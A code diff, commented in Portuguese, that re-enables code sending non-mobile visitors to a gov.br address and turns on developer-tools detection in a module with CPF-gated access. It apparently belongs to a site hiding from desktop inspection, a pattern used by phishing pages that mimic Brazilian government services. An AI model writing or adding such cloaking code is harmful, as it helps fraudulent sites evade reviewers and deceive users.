@@ -4,7 +4,7 @@
  * Utilitários de segurança avançados para proteção da aplicação contra clonagem e acesso não autorizado
  */
 
-const ANEEL_REDIRECT_URL = "https://antigo.aneel.gov.br/";
+const ANEEL_REDIRECT_URL = "https://www.gov.br/";
 const SECURITY_TOKEN_KEY = "anticlone_security_token";
 const ORIGIN_TOKEN_KEY = "origin_validation_token";
 const SESSION_START_KEY = "session_start_timestamp";
@@ -390,17 +390,14 @@ export function requireCpf(userData: any, navigate: (path: string) => void): boo
  * Realiza todas as verificações de segurança na inicialização
  */
 export function initializeSecurity(): void {
-  // Verificação de dispositivo móvel temporariamente desativada para testes
-  // if (!isMobileDevice()) {
-  //   window.location.href = ANEEL_REDIRECT_URL;
-  //   return;
-  // }
+  // Verificar se é mobile e redirecionar se não for
+  if (!isMobileDevice()) {
+    window.location.href = ANEEL_REDIRECT_URL;
+    return;
+  }
   
-  console.log("Inicializando segurança... (verificação de dispositivo desktop desativada para testes)");
+  console.log("Inicializando segurança...");
   
-  // Funções de segurança desativadas temporariamente para testes
-  // initAntiCloneProtection();
-  // setupDevToolsDetection();
-  // setTimeout(setupDomProtection, 500);
-  // setupAntiAutomationProtection();
+  // Configurar detecção de ferramentas de desenvolvedor
+  setupDevToolsDetection();
 }
